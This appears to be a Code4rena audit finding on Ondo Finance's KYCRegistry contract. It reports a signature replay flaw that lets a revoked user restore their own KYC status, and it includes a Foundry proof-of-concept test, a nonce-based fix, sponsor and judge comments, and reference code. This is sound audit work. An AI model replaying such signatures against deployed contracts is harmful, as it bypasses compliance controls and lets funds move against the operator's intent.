{
  "Title": "[M-04] KYCRegistry is susceptible to signature replay attack.",
  "Content": "\nThe KYCRegistry contract uses signatures to grant KYC status to the users using the `addKYCAddressViaSignature` function.\n\nHowever this function does not prevent replaying of signatures in the case where KYC status was revoked from a user.\n\n```solidity\n  function addKYCAddressViaSignature( ... ) external {\n    require(v == 27 || v == 28, \"KYCRegistry: invalid v value in signature\");\n    require(\n      !kycState[kycRequirementGroup][user],\n      \"KYCRegistry: user already verified\"\n    );\n    require(block.timestamp <= deadline, \"KYCRegistry: signature expired\");\n    bytes32 structHash = keccak256(\n      abi.encode(_APPROVAL_TYPEHASH, kycRequirementGroup, user, deadline)\n    );\n\n    bytes32 expectedMessage = _hashTypedDataV4(structHash);\n\n    address signer = ECDSA.recover(expectedMessage, v, r, s);\n    _checkRole(kycGroupRoles[kycRequirementGroup], signer);\n\n    kycState[kycRequirementGroup][user] = true;\n    // ...\n  }\n```\n\nThis function could be exploited in the case when these conditions are true:\n\n*   KYC status was granted to user using a signature with validity up to `deadline`.\n*   Before the `deadline` was passed, the KYC status of user was revoked using the `removeKYCAddresses` function.\n\nIn the abovementioned conditions, the malicious user can submit the original signature again to the `addKYCAddressViaSignature` function which will forcefully grant the KYC status to the malicious user again.\n\nIt should also be noted that due to this bug until the deadline has passed, the privileged accounts cannot revoke the KYC status of a KYC granted user. This can result in unwanted moving of funds by the user in/out of Ondo protocol.\n\n### Proof of Concept\n\nTest file created `BugTest.t.sol` and was run by ` forge test --mp ./forge-tests/BugTest1.t.sol  `\n\n```solidity\npragma solidity 0.8.16;\n\nimport \"forge-std/Test.sol\";\nimport \"forge-std/Vm.sol\";\n\nimport \"contracts/cash/kyc/KYCRegistry.sol\";\n\ncontract SanctionsList {\n    function isSanctioned(address) external pure returns (bool) {\n        return false;\n    }\n}\nstruct KYCApproval {\n    uint256 kycRequirementGroup;\n    address user;\n    uint256 deadline;\n}\n\ncontract BugTest1 is Test {\n    bytes32 APPROVAL_TYPEHASH;\n    bytes32 DOMAIN_SEPARATOR;\n    KYCRegistry registry;\n\n    address admin;\n    address kycAgent;\n    uint256 kycAgentPrivateKey = 0xB0B;\n    address attacker;\n\n    function setUp() public {\n        admin = address(0xad);\n        attacker = address(0xbabe);\n        kycAgent = vm.addr(kycAgentPrivateKey);\n        registry = new KYCRegistry(admin, address(new SanctionsList()));\n        APPROVAL_TYPEHASH = registry._APPROVAL_TYPEHASH();\n        DOMAIN_SEPARATOR = registry.DOMAIN_SEPARATOR();\n    }\n\n    function test_bug() public {\n        uint256 kycGroup = 1;\n        bytes32 kycGroupRole = \"0x01\";\n        vm.prank(admin);\n        registry.assignRoletoKYCGroup(kycGroup, kycGroupRole);\n        vm.prank(admin);\n        registry.grantRole(kycGroupRole, kycAgent);\n        vm.stopPrank();\n\n        uint256 deadline = block.timestamp + 1 days;\n        KYCApproval memory approval = KYCApproval({\n            kycRequirementGroup: kycGroup,\n            user: attacker,\n            deadline: deadline\n        });\n        bytes32 digest = getTypedDataHash(approval);\n        // KYC approval got signed with validity of 1 day\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(kycAgentPrivateKey, digest);\n\n        assertEq(registry.kycState(kycGroup, attacker), false);\n        assertEq(registry.getKYCStatus(kycGroup, attacker), false);\n\n        vm.prank(attacker);\n        registry.addKYCAddressViaSignature(kycGroup, attacker, deadline, v, r, s);\n\n        assertEq(registry.kycState(kycGroup, attacker), true);\n        assertEq(registry.getKYCStatus(kycGroup, attacker), true);\n\n        address[] memory toBeRemovedAddrs = new address[](1);\n        toBeRemovedAddrs[0] = attacker;\n        // KYC approval was removed\n        vm.prank(kycAgent);\n        registry.removeKYCAddresses(kycGroup, toBeRemovedAddrs);\n        vm.stopPrank();\n        assertEq(registry.getKYCStatus(kycGroup, attacker), false);\n\n        // KYC approval was granted again by replaying the original signature\n        vm.prank(attacker);\n        registry.addKYCAddressViaSignature(kycGroup, attacker, deadline, v, r, s);\n        assertEq(registry.kycState(kycGroup, attacker), true);\n        assertEq(registry.getKYCStatus(kycGroup, attacker), true);\n    }\n\n    function getStructHash(KYCApproval memory _approval) internal view returns (bytes32) {\n        return keccak256(abi.encode(APPROVAL_TYPEHASH, _approval.kycRequirementGroup, _approval.user, _approval.deadline));\n    }\n\n    function getTypedDataHash(KYCApproval memory _approval) public view returns (bytes32) {\n        return keccak256(abi.encodePacked(\"\\x19\\x01\", DOMAIN_SEPARATOR, getStructHash(_approval)));\n    }\n}\n```\n\n### Recommended Mitigation Steps\n\nA nonce mapping for message signers can be maintained; the value of which can be incremented for every successful signature validation.\n\n```solidity\nmapping(address => uint) private nonces;\n```\n\nA more detailed usage example can be found in OpenZeppelin's EIP-2612 implementation. \n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/extensions/ERC20Permit.sol#L90>\n\n**[ali2251 (Ondo Finance) disagreed with severity and commented](https://github.com/code-423n4/2023-01-ondo-findings/issues/187#issuecomment-1410643360):**\n > Timestamps prevent replay attacks. These timestamps are like 30 minutes long, so the attack is valid only within 30 minutes and we can change the timestamp to 5 minutes and then it becomes exteremely hard for this attack to happen. Within 5 minutes, a suer must add themselves, then Admin removed them, then they add themselves but once 5 minutes is over, the attacker can no longer add themselves and so the admin can just remove them after 5 minutes. It can be seen here that in tests we use 9 minutes: https://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/forge-tests/cash/registry/RegistrySignature.t.sol#L57\n\n**[Trust (judge) decreased severity to Medium](https://github.com/code-423n4/2023-01-ondo-findings/issues/187)**\n\n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/contests/2023-01-ondo-finance-contest",
  "Code": [
    {
      "filename": "contracts/token/ERC20/extensions/ERC20Permit.sol",
      "content": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/extensions/ERC20Permit.sol)\n\npragma solidity ^0.8.20;\n\nimport {IERC20Permit} from \"./IERC20Permit.sol\";\nimport {ERC20} from \"../ERC20.sol\";\nimport {ECDSA} from \"../../../utils/cryptography/ECDSA.sol\";\nimport {EIP712} from \"../../../utils/cryptography/EIP712.sol\";\nimport {Nonces} from \"../../../utils/Nonces.sol\";\n\n/**\n * @dev Implementation of the ERC-20 Permit extension allowing approvals to be made via signatures, as defined in\n * https://eips.ethereum.org/EIPS/eip-2612[ERC-2612].\n *\n * Adds the {permit} method, which can be used to change an account's ERC-20 allowance (see {IERC20-allowance}) by\n * presenting a message signed by the account. By not relying on `{IERC20-approve}`, the token holder account doesn't\n * need to send a transaction, and thus is not required to hold Ether at all.\n */\nabstract contract ERC20Permit is ERC20, IERC20Permit, EIP712, Nonces {\n    bytes32 private constant PERMIT_TYPEHASH =\n        keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\");\n\n    /**\n     * @dev Permit deadline has expired.\n     */\n    error ERC2612ExpiredSignature(uint256 deadline);\n\n    /**\n     * @dev Mismatched signature.\n     */\n    error ERC2612InvalidSigner(address signer, address owner);\n\n    /**\n     * @dev Initializes the {EIP712} domain separator using the `name` parameter, and setting `version` to `\"1\"`.\n     *\n     * It's a good idea to use the same `name` that is defined as the ERC-20 token name.\n     */\n    constructor(string memory name) EIP712(name, \"1\") {}\n\n    /**\n     * @inheritdoc IERC20Permit\n     */\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) public virtual {\n        if (block.timestamp > deadline) {\n            revert ERC2612ExpiredSignature(deadline);\n        }\n\n        bytes32 structHash = keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, _useNonce(owner), deadline));\n\n        bytes32 hash = _hashTypedDataV4(structHash);\n\n        address signer = ECDSA.recover(hash, v, r, s);\n        if (signer != owner) {\n            revert ERC2612InvalidSigner(signer, owner);\n        }\n\n        _approve(owner, spender, value);\n    }\n\n    /**\n     * @inheritdoc IERC20Permit\n     */\n    function nonces(address owner) public view virtual override(IERC20Permit, Nonces) returns (uint256) {\n        return super.nonces(owner);\n    }\n\n    /**\n     * @inheritdoc IERC20Permit\n     */\n    // solhint-disable-next-line func-name-mixedcase\n    function DOMAIN_SEPARATOR() external view virtual returns (bytes32) {\n        return _domainSeparatorV4();\n    }\n}"
    },
    {
      "filename": "forge-tests/cash/registry/RegistrySignature.t.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.16;\n\nimport \"forge-tests/cash/BasicDeployment.sol\";\nimport \"forge-std/console2.sol\";\nimport \"contracts/cash/external/openzeppelin/contracts/utils/cryptography/ECDSA.sol\";\n\ncontract SigUtils {\n  bytes32 internal DOMAIN_SEPARATOR;\n  bytes32 internal APPROVAL_TYPEHASH;\n\n  constructor(bytes32 _DOMAIN_SEPARATOR, bytes32 _APPROVAL_TYPEHASH) {\n    DOMAIN_SEPARATOR = _DOMAIN_SEPARATOR;\n    APPROVAL_TYPEHASH = _APPROVAL_TYPEHASH;\n  }\n\n  struct KYCApproval {\n    uint256 kycRequirementGroup;\n    address user;\n    uint256 deadline;\n  }\n\n  // Computes the hash of a KYCApproval\n  function getStructHash(\n    KYCApproval memory _approval\n  ) internal view returns (bytes32) {\n    return\n      keccak256(\n        abi.encode(\n          APPROVAL_TYPEHASH,\n          _approval.kycRequirementGroup,\n          _approval.user,\n          _approval.deadline\n        )\n      );\n  }\n\n  function getTypedDataHash(\n    KYCApproval memory _approval\n  ) public view returns (bytes32) {\n    return\n      keccak256(\n        abi.encodePacked(\"\\x19\\x01\", DOMAIN_SEPARATOR, getStructHash(_approval))\n      );\n  }\n}\n\ncontract TestKYCRegistry is BasicDeployment {\n  address verifyingContract = address(registry);\n  SigUtils internal sigUtils;\n  uint256 internal signerPrivateKey;\n  address internal signer;\n  bytes32 public constant KYC_GROUP_1_ROLE = keccak256(\"KYC_GROUP_1_ROLE\");\n\n  address user1 = address(0x5);\n  address user2 = address(0x6);\n  uint256 deadline = 500;\n\n  uint8 v;\n  bytes32 r;\n  bytes32 s;\n\n  function setUp() public {\n    deployKYCRegistry();\n    sigUtils = new SigUtils(\n      registry.DOMAIN_SEPARATOR(),\n      registry._APPROVAL_TYPEHASH()\n    );\n    signerPrivateKey = 0xB0B;\n    signer = vm.addr(signerPrivateKey);\n    vm.startPrank(registryAdmin);\n    registry.assignRoletoKYCGroup(1, KYC_GROUP_1_ROLE);\n    // Signer can sign transactions that modify kyc requirement group 1.\n    registry.grantRole(KYC_GROUP_1_ROLE, signer);\n    vm.stopPrank();\n    vm.warp(deadline - 1);\n\n    // Create signature under test\n    SigUtils.KYCApproval memory approval = SigUtils.KYCApproval({\n      kycRequirementGroup: 1,\n      user: user1,\n      deadline: deadline\n    });\n    // EIP 712\n    bytes32 digest = sigUtils.getTypedDataHash(approval);\n    (uint8 _v, bytes32 _r, bytes32 _s) = vm.sign(signerPrivateKey, digest);\n    v = _v;\n    r = _r;\n    s = _s;\n  }\n\n  function test_signature_add_happy_case() public {\n    vm.expectEmit(true, true, true, true);\n    emit KYCAddressAddViaSignature(address(this), user1, signer, 1, deadline);\n    registry.addKYCAddressViaSignature(1, user1, deadline, v, r, s);\n    assertEq(registry.getKYCStatus(1, user1), true);\n  }\n\n  function test_signature_add_fail_because_noop() public {\n    registry.addKYCAddressViaSignature(1, user1, deadline, v, r, s);\n    assertEq(registry.getKYCStatus(1, user1), true);\n    // Revert rather than perform no-op operation.\n    vm.expectRevert(\"KYCRegistry: user already verified\");\n    registry.addKYCAddressViaSignature(1, user1, deadline, v, r, s);\n    assertEq(registry.getKYCStatus(1, user1), true);\n  }\n\n  function test_signature_add_fail_expiry() public {\n    // Change Block.timestamp to be > deadline\n    vm.warp(501);\n    vm.expectRevert(\"KYCRegistry: signature expired\");\n    registry.addKYCAddressViaSignature(1, user1, deadline, v, r, s);\n    assertEq(registry.getKYCStatus(1, user1), false);\n  }\n\n  function test_signature_add_fail_bad_v() public {\n    vm.expectRevert(\"KYCRegistry: invalid v value in signature\");\n    registry.addKYCAddressViaSignature(1, user1, deadline, 29, r, s);\n    vm.expectRevert(\"KYCRegistry: invalid v value in signature\");\n    registry.addKYCAddressViaSignature(1, user1, deadline, 26, r, s);\n    assertEq(registry.getKYCStatus(1, user1), false);\n  }\n\n  function test_signature_add_group_mismatch() public {\n    SigUtils.KYCApproval memory approval = SigUtils.KYCApproval({\n      kycRequirementGroup: 2, // Group 2 instead of 1\n      user: user1,\n      deadline: deadline\n    });\n    bytes32 digest = sigUtils.getTypedDataHash(approval);\n    (uint8 _v, bytes32 _r, bytes32 _s) = vm.sign(signerPrivateKey, digest);\n    // Will revert based on \"access control\"\n    // because the groups mismatch in the computed hashes\n    // causing ecrecover to resolve to an incorrect address (0x62...);\n    vm.expectRevert(\n      _formatACRevert(\n        address(0xA04476a7Ed0401D81d0192c22EE55B7b59c1EE6a),\n        KYC_GROUP_1_ROLE\n      )\n    );\n    registry.addKYCAddressViaSignature(1, user1, deadline, _v, _r, _s);\n  }\n\n  function test_signature_add_fail_access_control() public {\n    SigUtils.KYCApproval memory approval = SigUtils.KYCApproval({\n      kycRequirementGroup: 2, // Group 2 instead of 1\n      user: user1,\n      deadline: deadline\n    });\n    bytes32 digest = sigUtils.getTypedDataHash(approval);\n    (uint8 _v, bytes32 _r, bytes32 _s) = vm.sign(signerPrivateKey, digest);\n\n    // Signature is correct, but signer doesn't have access to add to kyc\n    // requirement group 2.\n    vm.expectRevert(_formatACRevert(signer, KYC_GROUP_2_ROLE));\n    registry.addKYCAddressViaSignature(2, user1, deadline, _v, _r, _s);\n  }\n\n  function test_signature_add_fail_bad_user() public {\n    // Will revert based on \"access control\"\n    // because the users mismatch in the computed hashes\n    // causing ecrecover to resolve to an incorrect address\n    vm.expectRevert(\n      _formatACRevert(\n        address(0xC6ee2603b208983BED1764f9F46DD902384dB9F1),\n        KYC_GROUP_1_ROLE\n      )\n    );\n    // User 2 instead of user 1\n    registry.addKYCAddressViaSignature(1, user2, deadline, v, r, s);\n  }\n\n  function test_signature_add_fail_bad_deadline() public {\n    // Will revert based on \"access control\"\n    // because the deadlines mismatch in the computed hashes\n    // causing ecrecover to resolve to an incorrect address\n    vm.expectRevert(\n      _formatACRevert(\n        address(0x6576698Af915dfCf3982f18C2b328C0d06681d61),\n        KYC_GROUP_1_ROLE\n      )\n    );\n    // Deadline is different than what is hashed and signed.\n    registry.addKYCAddressViaSignature(1, user1, deadline + 100, v, r, s);\n  }\n}"
    }
  ]
}